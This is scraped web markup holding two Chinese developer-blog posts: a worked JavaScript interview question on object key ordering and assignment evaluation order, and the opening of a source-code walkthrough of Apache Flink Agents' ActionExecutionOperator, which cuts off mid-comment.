#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">本文大纲</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b632613fda249f58d35395df0e16d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=igCEr5sAjtarjWf%2Fc60OP%2BOWCWo%3D" alt="" loading="lazy"/></p>
<p>今天来看一道前端面试的代码输出题。</p>
<p>面试官提供了一段 <code>Javascript</code> 代码，要求给出这段代码运行后的输出结果。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};

obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">a</span>++;
<span class="hljs-keyword">const</span> values = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(obj);
obj[values[<span class="hljs-number">1</span>]] = obj.<span class="hljs-property">a</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj);

</code></pre>
<p>先分析这道题前，先补充两个个前置知识点。</p>
<h2 data-id="heading-1">知识点一：对象的常规属性 (properties) 和排序属性 (elements)</h2>
<p>先来看下面一段代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {};
obj[<span class="hljs-string">'b'</span>] = <span class="hljs-string">'b'</span>
obj[<span class="hljs-number">100</span>] = <span class="hljs-string">'100'</span>;
obj[<span class="hljs-number">1</span>] = <span class="hljs-string">'1'</span>;
obj[<span class="hljs-string">'a'</span>] = <span class="hljs-string">'a'</span>;
obj[<span class="hljs-number">50</span>] = <span class="hljs-string">'50'</span>;
obj[<span class="hljs-string">'c'</span>] = <span class="hljs-string">'c'</span>;

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj){ 
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`key: <span class="hljs-subst">${key}</span> value: <span class="hljs-subst">${obj[key]}</span>`</span>)
}
<span class="hljs-comment">/**
 * 打印结果如下：
  key: 1 value: 1
  key: 50 value: 50
  key: 100 value: 100
  key: b value: b
  key: a value: a
  key: c value: c
 */</span>
</code></pre>
<p>观察下打印的数据，很明显属性的设置顺序并不是打印的顺序，比如 <code>b</code> 属性是第一个设置的，打印结果却排在 <code>100</code> 后面，仔细分析他们的打印规律，可以得到如下特点：</p>
<ol>
<li>数字类的属性不管设置的顺序先后，都会被优先打印，而且是按照从小到大的升序进行打印的。</li>
<li>字符类属性会按照设置的顺序进行打印，上面我们是按照 <code>b</code>、<code>a</code>、<code>c</code> 的顺序进行设置的，打印顺序也是如此。</li>
</ol>
<p>为什么会出现这样的结果呢？</p>
<p>这是因为 ECMAScript 规范中定义了<strong>数字属性应该按照索引值大小升序排列，字符串属性根据创建时的顺序升序排列</strong>。在 <code>V8</code> 中数字属性被称为 <code>elements</code>，字符串属性被称为 <code>properties</code>。之所以这样设置，主要是为了提升访问性能。<code>elements</code> 对象中会按照顺序存放数字属性，类似于数组的存储，这样查询的效率当然就很高了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5555d23ce9e4f25b2ff5ecbb936bdb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=%2BDV%2Btev3fVwCcpimN5bLZ7u0834%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">知识点二：JavaScript 运算符的执行顺序</h2>
<p><code>JavaScript</code> 中最常见运算符如下（<strong>运算顺序从高到低排列</strong>）：</p>
<ul>
<li>对象属性访问，比如 <code>obj.a</code>，<code>obj['a']</code>。</li>
<li>递增/递减，比如 <code>a++</code>(后置递增) 或 <code>++a</code>（前置递增）。</li>
<li>算术，比如 <code>a + 1</code>。</li>
<li>比较，包括 <code>&lt;</code>(小于)、<code>&gt;</code>(大于)、<code>&lt;=</code>(小于等于)、<code>&gt;=</code>(大于等于)，比如 <code>a &gt; 3</code>。</li>
<li>相等，包括 <code>==</code> 粗略相等， <code>===</code>严格相等，<code>!==</code> 粗略不等，<code>!==</code> 严格不等，比如 <code>a == 1</code>。</li>
<li>逻辑，也就是与或非，<code>&amp;</code>(与)、<code>|</code>(或)、<code>!</code>(非)，比如 <code>a &amp;&amp; b</code>。</li>
<li>三元，比如 <code>flag ? '1' : '0'</code>。</li>
<li>赋值，比如 <code>a = 1</code>。</li>
</ul>
<p>对于单个赋值语句 <code>LHS = RHS</code> 的求值，根据 <code>ECMAScript</code> 规范（<code>ECMA-262, AssignmentExpression evaluation</code>），对于 <code>LeftHandSideExpression = AssignmentExpression</code>，其计算顺序如下：</p>
<ul>
<li>第一步，先得到一个 <code>引用（Reference）</code>，即“要写入的位置”，也就是 <code>Evaluate LeftHandSideExpression</code>。</li>
<li>第二步，再计算右侧的值，<code>Evaluate AssignmentExpression</code>。</li>
<li>最后将第二步得到的值写入第一步的引用当中。</li>
</ul>
<p>也就是说，对于<code>LHS = RHS</code> 这样的赋值表达式，其计算顺序是左侧先求值（为了知道写到哪），右侧后求值（为了知道写什么），最后将右侧的值写入左侧。</p>
<blockquote>
<p>📌 注意：这里说的“左侧求值”不是求它的值，而是求它的“位置”（比如属性名、变量名等）。例如对于 <code>obj[++obj.a]</code>，要确定属性名，就必须先执行 <code>++obj.a</code>。</p>
</blockquote>
<p>写个简单例子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">a</span>() {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'获取 a 的值'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
  },
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">b</span>() {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'获取 b 的值'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
  }
}
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">b</span>++;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'obj: '</span>, obj);

</code></pre>
<p>我们前面说过，运算符顺序是<strong>对象属性访问 &gt; 递增/递减 &gt; 赋值</strong>，对于赋值运算符 <code>LHS = RHS</code>，会先求出左侧 <code>LHS</code> 的<code>引用（Reference）</code>，再计算右侧 <code>RHS</code> 的值，最后将右侧的值赋值给左侧的引用。所以用这个逻辑来分析下这段代码的执行顺序：</p>
<ul>
<li>第一步，先取 <code>obj.a</code> 的值， 取到的值为 <code>1</code>， 然后执行前置递增 <code>++obj.a</code>，结果为 <code>2</code>，然后程序就知道要往 <code>obj</code> 的 <code>2</code> 属性上赋值了。</li>
<li>第二步，然后再取 <code>obj.b</code> 的值，执行后置递增 <code>obj.b++</code>，右侧计算的值为 <code>2</code>。</li>
<li>最后把右侧计算的结果值 <code>2</code> 赋值给 <code>obj[2]</code> 属性。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d65d8e0804454dab897786f17dd1d7c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=%2BLRc9h4VCVtobLCUpm3j6Jpp9Tk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">逐行分析代码执行过程</h2>
<p>了解了这两个知识点后，让我们来逐行解析下这段代码。</p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};

obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
obj[++obj.<span class="hljs-property">a</span>] = obj.<span class="hljs-property">a</span>++;
<span class="hljs-keyword">const</span> values = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(obj);
obj[values[<span class="hljs-number">1</span>]] = obj.<span class="hljs-property">a</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj);

</code></pre>
<ol>
<li>首先，我们定义了一个对象 <code>obj</code>，它有一个属性 <code>a</code>，值为 <code>0</code>。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,
};
</code></pre>
<ol start="2">
<li>接下来，我们给 <code>obj</code> 添加了一个属性 <code>1</code>，值为 <code>0</code>，此时对象中有两个属性，<code>a</code> 和 <code>1</code>。</li>
</ol>
<pre><code class="hljs language-js" lang="js">obj[<span class="hljs-string">'1'</span>] = <span class="hljs-number">0</span>;
</code></pre>
<p>由于数字属性会排在前面，此时 <code>obj</code> 的值为：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>然后会执行 <code>obj[++obj.a] = obj.a++</code>，前面我们分析过运算符的优先级，先执行左侧 <code>++obj.a</code> 得到 <code>1</code>，然后执行右侧 <code>obj.a++</code>, 由于是后置递增，所以右侧的值为 <code>1</code>，执行赋值后，<code>obj</code> 的值为：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ol start="4">
<li>经过 <code>Object.values(obj)</code> 后，<code>values</code> 的值为 <code>[1, 2]</code>。</li>
<li>执行 <code>obj[values[1]] = obj.a</code> ，转换后就是 <code>obj[2] = 2</code>。<code>obj</code> 的值变为：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"1"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"2"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>这就是最终的输出结果了。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67db3f198c3548cbbe02e574f02adaf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5bCP5a-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481095&amp;x-signature=hERycHLSiHFwiZNtvxWD1gG4z2k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">小结</h2>
<p>该题主要考察两个知识点：</p>
<ol>
<li>在 <code>JavaScript</code> 对象中，属性的设置顺序并不一定是循环打印顺序，在 <code>V8</code>中，数字类的属性在被称为 <code>elements</code>（按从小到大排列存储），字符类属性被称为 <code>properties</code>（按添加顺序存储）。</li>
<li><code>JavaScript</code> 运算符的运算顺序是<strong>对象属性访问 &gt; 递增/递减 &gt; 赋值</strong>，对于赋值运算符 <code>LHS = RHS</code>，会先求出左侧 <code>LHS</code> 的<code>引用（Reference）</code>，再计算右侧 <code>RHS</code> 的值，最后将右侧的值赋值给左侧的引用。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【大数据 & AI】Flink Agents 源码解读 --- (5) --- ActionExecutionOperator]]></title>    <link>https://juejin.cn/post/7592818202717192211</link>    <guid>https://juejin.cn/post/7592818202717192211</guid>    <pubDate>2026-01-08T12:44:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592818202717192211" data-draft-id="7592452108797313067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【大数据 &amp; AI】Flink Agents 源码解读 --- (5) --- ActionExecutionOperator"/> <meta itemprop="keywords" content="算法,人工智能,数据分析"/> <meta itemprop="datePublished" content="2026-01-08T12:44:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="罗西的思考"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【大数据 &amp; AI】Flink Agents 源码解读 --- (5) --- ActionExecutionOperator
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    罗西的思考
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:44:20.000Z" title="Thu Jan 08 2026 12:44:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【大数据 &amp; AI】Flink Agents 源码解读 --- (5) --- ActionExecutionOperator</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 摘要</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 基础知识</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 总体架构</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 定义</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 关键设计</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.4 流程</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.5 组件 &amp; 关系</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.6 核心依赖组件</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.7 主要功能</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.8 运行ActionTask流程</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.8 Flink MailboxExecutor</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 ActionExecutionOperator 生成机制和策略</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 生成位置</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 生成机制</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 关键生成策略</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.4 操作符初始化过程</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.5 与执行环境的集成</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.6 总结</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 任务拆分机制详解</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 任务拆分的基本原理</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 任务创建过程</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x04 任务队列管理</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.1 任务状态存储</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.2 任务调度机制</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.3 任务处理循环</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x05 实际应用示例</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">5.1 异步 HTTP 请求处理</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">5.2 复杂业务流程处理</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF 参考</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 摘要</h3>
<p>ActionExecutionOperator 是整个Flink Agent 系统的执行引擎，它连接了 Flink 流处理框架和 Agent 逻辑，协调各种组件完成了 Agent 定义的动作执行。ActionExecutionOperator 主要职责：</p>
<ul>
<li>事件处理：接收来自上游的数据，包装成InputEvent</li>
<li>动作执行：根据Agent定义的动作规则，触发相应的处理逻辑</li>
<li>状态管理：维护短期记忆，检查点状态等</li>
<li>异步支持：处理需要异步执行的任务</li>
<li>Python/Java交互操作：协调组件间的交互</li>
<li>输出产生：将最终结果作为OutputEvent发送到下游</li>
</ul>
<p>这样，整个Agent的逻辑就被集成到了标准的Flink流处理管道中，能够利用Flink的分布式计算能力和容错机制。</p>
<p>本篇主要是为了学习 ActionExecutionOperator 的架构，生成机制和策略，也会学习 ActionExecutionOperator 如何使用 AgentPlan，如何生成 ActionTask。</p>
<h3 data-id="heading-2">0x01 基础知识</h3>
<p>ActionExecutionOperator 算子是整个 Flink Agent 框架运行时的核心组件，负责将用户定义的代理逻辑转换为实际的流处理操作。</p>
<h4 data-id="heading-3">1.1 总体架构</h4>
<p>可以把 Flink Agents 的整个执行流程比作 “做一道菜”，我们借此进行分析。</p>
<p>Flink Agents 是基于原生 Flink 分布式流处理能力封装的上层框架。其中四个主要组件代表了 Flink Agents 框架中的四个层次：</p>
<ul>
<li><strong>Agent（顶层设计，定义了“做什么”）</strong> ：用户定义的智能实体，类似 “餐厅菜单 + 规则手册”，包含业务逻辑、动作（Action）和资源（工具、模型等）定义，明确 “做什么”。</li>
<li><strong>AgentPlan（中间编译层，确定了“怎么做”）</strong> ：将 Agent 编译后的可执行计划，类似 “详细操作流程图”，明确动作触发规则、资源映射关系，确定 “怎么做”。</li>
<li><strong>ActionExecutionOperator（运行时执行层，是执行环境，负责“协调调度”）</strong> ：Flink 集群中的执行核心，在 Flink 流处理环境中实际执行操作，类似 “餐厅首席大厨”，负责接收数据、调度任务、管理状态，协调整体执行流程。</li>
<li><strong>ActionTask（最小执行单元，负责“具体实施”）</strong> ：具体的执行任务，类似 “员工的单个服务步骤”，分为 JavaActionTask 和 PythonActionTask，处理单个事件并返回结果。</li>
</ul>
<p>具体可以参见下图。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Agent</span>] 菜单手册
    ↓（编译）
[<span class="hljs-meta">AgentPlan</span>] 详细流程图
    ↓（运行时实例化）
[<span class="hljs-meta">ActionExecutionOperator</span>] 餐厅首席大厨
    ↓（分配任务）
[<span class="hljs-meta">ActionTask</span>] 员工具体任务
</code></pre>
<p>这样的设计使得系统既灵活又高效，能够处理复杂的AI代理任务，同时保证了良好的扩展性和维护性。</p>
<h4 data-id="heading-4">1.2 定义</h4>
<p>ActionExecutionOperator 的定义如下。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">/**
 * An <span class="hljs-keyword">operator</span> that executes the actions defined <span class="hljs-keyword">in</span> the agent. Upon receiving data <span class="hljs-keyword">from</span> the
 * upstream, it first wraps the data <span class="hljs-keyword">into</span> an {@link InputEvent}. It <span class="hljs-keyword">then</span> invokes the corresponding
 * action that <span class="hljs-built_in">is</span> interested <span class="hljs-keyword">in</span> the {@link InputEvent}, <span class="hljs-built_in">and</span> collects the output <span class="hljs-keyword">event</span> produced <span class="hljs-keyword">by</span>
 * the action.
 *
 * &lt;p&gt;<span class="hljs-keyword">For</span> events <span class="hljs-keyword">of</span> type {@link OutputEvent}, the data contained <span class="hljs-keyword">in</span> the <span class="hljs-keyword">event</span> <span class="hljs-built_in">is</span> sent downstream.
 * <span class="hljs-keyword">For</span> all other <span class="hljs-keyword">event</span> types, the process <span class="hljs-built_in">is</span> repeated: the <span class="hljs-keyword">event</span> triggers the corresponding action,
